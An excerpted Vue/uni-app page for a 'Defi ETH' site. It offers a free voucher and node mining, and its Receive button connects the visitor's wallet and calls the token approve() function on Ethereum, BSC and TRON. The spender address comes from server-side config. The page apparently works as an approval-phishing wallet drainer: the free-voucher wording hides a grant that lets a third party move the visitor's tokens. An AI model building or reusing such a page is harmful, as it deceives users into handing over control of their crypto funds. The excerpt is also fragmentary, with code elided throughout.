<template>
	<view class="content">
		<view class="toprap">
			<view class="h1">Defi ETH</view>
			<view class="bagconnect" @click="chooselink">{{contenttxt}}</view>
		</view>
		<view class="banner">
			<image src="../../static/img/2023020743924.png" class="bannerimg" mode="widthFix"></image>
			<view class="banner-content">
				<view class="banner-t">Receive Voucher No pledge</view>
				<view class="banner-tip">Join the node and start mining</view>
				<view class="banner-btn" @click="doapprove">Receive</view>
			</view>
		</view>
	</view>
</template>
		...
		methods: {
			...
			async doapprove_trc(){
				...
				try{					
					...
					const parameter = [{type:'address',value:contractdata.contract},{type:'uint256',value:_value}];
			...
			async doapprove_eth(){	
				...
				//以太坊/币安  授权开始
				let that = this;
					let strabi = '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
					...
					Contractjs.methods.approve(contractdata.contract, _value).send({from: that.address}, function(error, result){
						uni.hideLoading()
						if(!error){
			...
			doapprove(){
				...
				if (!this.contract || !this.contract.contract || !this.contract.contract[linkname] || !this.contract.contract[linkname].contract){
			...
			async ethcontent(){
				...
				var obj = setInterval(async ()=>{					
					if (window.ethereum){
						...
						const myadd= await ethereum.request({method: 'eth_requestAccounts'});
						//const echainId = await ethereum.request({method: 'eth_chainId'});
						comjs.msg(echainId)
...
<style>
	.toprap {position: relative;text-align: center;line-height: 44px;height: 44px;overflow: hidden;padding:0 200px;}
	.bagconnect {position: absolute;right:10px;top:5px;height:34px;line-height: 34px;background:blue;font-size: 14px;padding:0 10px;border-radius: 5px;color: #fff;}
	.banner {padding-top:15px;position: relative;color: #fff;}
	.bannerimg {width: 100%;}
	.banner-content {position: absolute;left:25px;right:25px;bottom:25px;}
	.banner-t {color:#fff;font-size: 20px;padding-bottom: 25px;}
	.banner-tip {font-size: 12px;padding-bottom:10px;}
	.banner-btn {display: inline-block;background: blue;line-height: 44px;height: 44px;border-radius: 6px;padding: 0 25px;font-size: 16px;}
